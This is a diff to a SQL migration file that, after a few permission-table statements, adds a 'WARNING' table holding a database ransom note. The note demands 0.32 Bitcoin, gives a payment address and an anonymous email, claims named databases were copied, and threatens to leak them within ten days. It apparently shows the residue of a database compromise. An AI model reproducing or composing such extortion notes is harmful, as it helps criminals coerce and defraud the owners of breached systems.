@@ -29,3 +29,20 @@ UPDATE `wp_auth_permission` SET `method` = 'get' WHERE `app` IN ('culture') AND 
 
 
 ------ TRUNCATE `wp_auth_role_permission`;
+
+
+CREATE TABLE `WARNING` (
+  `id` int(11) NOT NULL,
+  `warning` varchar(2000) NOT NULL DEFAULT '',
+  `Bitcoin_Address` varchar(200) NOT NULL DEFAULT '',
+  `Email` varchar(200) NOT NULL DEFAULT ''
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
+INSERT INTO `WARNING` (`id`, `warning`, `Bitcoin_Address`, `Email`) VALUES
+(1, 'To recover your lost Database and avoid leaking it: Send us 0.32 Bitcoin (BTC) to our Bitcoin address 4Vse25IWH7HyofMwiUiqu7p8hpfowJIOa and contact us by Email with your Server IP or Domain name and a Proof of Payment. Your Database is downloaded and backed up on our servers. Backups that we have right now: bbs, blog, chat, laravelshop. Any email without your server IP Address or Domain Name and a Proof of Payment together will be ignored. If we dont receive your payment in the next 10 Days, we will make your database public or use them otherwise. ', '4Vse25IWH7HyofMwiUiqu7p8hpfowJIOa', 'dbrecovery@anynomail.to');
+
+ALTER TABLE `WARNING`
+  ADD PRIMARY KEY (`id`);
+ALTER TABLE `WARNING`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
+COMMIT;
